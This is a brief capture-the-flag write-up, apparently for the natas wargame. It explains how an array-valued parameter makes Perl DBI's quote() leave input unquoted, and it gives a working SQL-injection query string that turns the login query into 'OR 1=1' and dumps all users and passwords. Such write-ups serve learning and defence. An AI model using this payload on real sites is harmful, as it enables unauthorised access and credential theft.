Leverages a very specific perl vulnerability from dbi/cgi

perl 'quote()' takes in two inputs: the string to be 'quoted' and an optional 2nd parameter that dictates the 'type' of the string being quoted.

Passing in the integer '2' as the optional parameter makes the string be treated as an integer thereby not quoting it....????

as such when the website calls:
__________________________________________________________________________________________________________________________
"Select * FROM users where username =".$dbh->quote(param('username')) . " and password =".$dbh->quote(param('password'))
__________________________________________________________________________________________________________________________

by passing in
_______________________________________________
?username=natas31&password=''+OR+1=1&password=2
_______________________________________________

you bypass the 'quote' method and send in

'Select * FROM users where username ='natas31' and password = '' OR 1=1;

which dumps out every user / pass in the database. Yikes.

Thanks, perl!
